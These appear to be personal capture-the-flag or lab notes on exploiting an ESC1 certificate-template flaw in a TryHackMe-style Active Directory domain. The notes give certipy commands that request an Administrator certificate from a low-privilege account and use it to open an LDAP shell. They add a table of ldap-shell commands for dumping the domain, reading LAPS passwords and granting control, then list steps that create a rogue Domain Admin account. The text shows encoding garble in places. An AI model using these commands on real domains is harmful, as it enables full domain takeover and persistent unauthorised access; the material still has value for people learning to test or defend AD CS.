Exploiting an ESC1 vulnerability typically involves two main steps:

1. Requesting a certificate using the vulnerable template, injecting the identity of a privileged target.
2. Using the obtained certificate to authenticate as the target.

## Step 1: Request the certificate for the target user

- The attacker (`SUSANNA_MCKNIGHT@thm.local`) uses¬†`certipy req`¬†to request a certificate. They specify the vulnerable template (`ServerAuth`) and provide the UPN and SID of the desired target account (e.g.,¬†`administrator@thm.local`).
    
### Requesting the certificate

#Attacking_machine 
```
certipy req \    
    -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' \
    -ca 'thm-LABYRINTH-CA' -template ServerAuth \
    -upn 'AMINISTRATOR@THM.LOCAL' -dc-ip <MACHINE IP>
```


From Susanna‚Äôs account:

certipy-ad req \
  -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!' \
  -ca 'thm-LABYRINTH-CA' \
  -template 'ServerAuth' \
  -upn 'administrator@thm.local' \
  -dc-ip 10.10.204.67


- This issues a certificate for **Administrator** (SID 500) even though we are Susanna.
    
- Output: `administrator.pfx`
    

---

### Step 2:Using the obtained certificate to authenticate as the target

#Attacking_machine 

```
certipy-ad auth -ldap-shell -pfx administrator.pfx -dc-ip <MACHINE IP> -username administrator  -domain thm.local
```

Let‚Äôs break down what this command does, piece by piece:

### 1Ô∏è‚É£ certipy-ad auth

- This is the **authentication module** of Certipy.
- Its purpose is to **authenticate to Active Directory** using credentials, hashes, or certificates.




### 2Ô∏è‚É£ -ldap-shell

- Tells Certipy to **open an interactive LDAP shell** after authentication.
- You can then browse AD objects, enumerate users/groups, download files, or execute PowerShell scripts (if allowed).



### 3Ô∏è‚É£ -pfx administrator.pfx

- Specifies the **certificate file** (in PFX format) to authenticate.
- This is a PKI certificate for the account (`administrator`) ‚Äî no password needed if the certificate allows logon.



### 4Ô∏è‚É£ -dc-ip MACHINE IP

- Specifies the **Domain Controller IP** to connect to.
- Avoids relying on DNS; connects directly to the given DC.



### 5Ô∏è‚É£ -username administrator

- Specifies the **user principal** to use.
- Must match the certificate‚Äôs **UPN** (like `administrator@thm.local`).



### 6Ô∏è‚É£ -domain thm.local

- Specifies the **Active Directory domain**.
    



### **‚úÖ What happens when you run it**

1. Certipy uses the `administrator.pfx` certificate to authenticate against the DC at `10.10.204.67`.
    
2. If successful, it opens a **LDAP shell** as the `administrator` user.
    
3. From the shell, you can:
    
    - List users: `users`
        
    - List groups: `groups`
        
    - Download files: `download <remote> <local>`
        
    - Execute PowerShell: `execute powershell <script>`
        
    - Enumerate AD objects: `ls`, `cd`, `get`
        



üí° **Important:**  
This method **doesn‚Äôt require the administrator password** because the certificate provides authentication. It‚Äôs commonly used in **certificate-based attacks (ESC1 / PKINIT abuse)**.


---

## ldap-shell commands
### **User / Computer Management**

| Command                                     | Description                                          | Example                                      |
| ------------------------------------------- | ---------------------------------------------------- | -------------------------------------------- |
| `add_user new_user [parent]`                | Create a new user. Optional `[parent]` is the OU/DN. | `add_user NEWADMIN`                          |
| `add_computer computer [password] [nospns]` | Add a new computer account.                          | `add_computer DC01 P@ssw0rd123!`             |
| `rename_computer current_name new_name`     | Rename a computer‚Äôs SAMAccountName.                  | `rename_computer OLDPC NEWPC`                |
| `add_user_to_group user group`              | Add a user to a group (like Domain Admins).          | `add_user_to_group NEWADMIN "Domain Admins"` |
| `change_password user [password]`           | Change user password (requires LDAPS).               | `change_password NEWADMIN P@ssw0rd123!`      |
| `enable_account user`                       | Enable a disabled account.                           | `enable_account NEWADMIN`                    |
| `disable_account user`                      | Disable an account.                                  | `disable_account NEWADMIN`                   |

### **Delegation / Permissions**

|Command|Description|Example|
|---|---|---|
|`grant_control target grantee`|Grant full control of a target object to grantee.|`grant_control TARGETUSER NEWADMIN`|
|`set_rbcd target grantee`|Grant RBCD rights (resource-based constrained delegation).|`set_rbcd TARGETHOST NEWADMIN`|
|`clear_rbcd target`|Remove RBCD config from a target.|`clear_rbcd TARGETHOST`|
|`set_dontreqpreauth user true/false`|Set/prevent Kerberos pre-auth.|`set_dontreqpreauth NEWADMIN true`|

### **AD / Domain Info**

|Command|Description|Example|
|---|---|---|
|`whoami`|Show currently authenticated user.|`whoami`|
|`dump`|Dump the domain (users, groups, computers).|`dump`|
|`search query [attributes,]`|Search objects by name, DN, or sAMAccountName.|`search Administrator`|
|`get_user_groups user`|List all groups a user belongs to.|`get_user_groups NEWADMIN`|
|`get_group_users group`|List all users in a group.|`get_group_users "Domain Admins"`|
|`get_laps_password computer`|Get LAPS password for a computer.|`get_laps_password LAPTOP01`|

### **Security / Encryption**

|Command|Description|Example|
|---|---|---|
|`start_tls`|Upgrade LDAP to LDAPS for encrypted operations.|`start_tls`|
|`write_gpo_dacl user gpoSID`|Write full control ACE to a GPO for a user.|`write_gpo_dacl NEWADMIN {S-1-5-21-...}`|

### **Misc / Session**

|Command|Description|Example|
|---|---|---|
|`dirsync`|Request directory synchronization attributes.|`dirsync`|
|`exit`|Close the LDAP shell session.|`exit`|

---

## Creating a new admin account

#ldap_shell

### 1Ô∏è‚É£ Create the new user
add_user NEWADMINISTRATOR

### 2Ô∏è‚É£ Set password (if needed)
set NEWADMINISTRATOR userPassword 'P@ssw0rd123!'

### 3Ô∏è‚É£ Enable the new account
enable_account NEWADMINISTRATOR

### 4Ô∏è‚É£ Add user to Domain Admins
add_user_to_group NEWADMINISTRATOR "Domain Admins"


**Next step:** [[RDP logging as NEWADMINISTRATOR]]

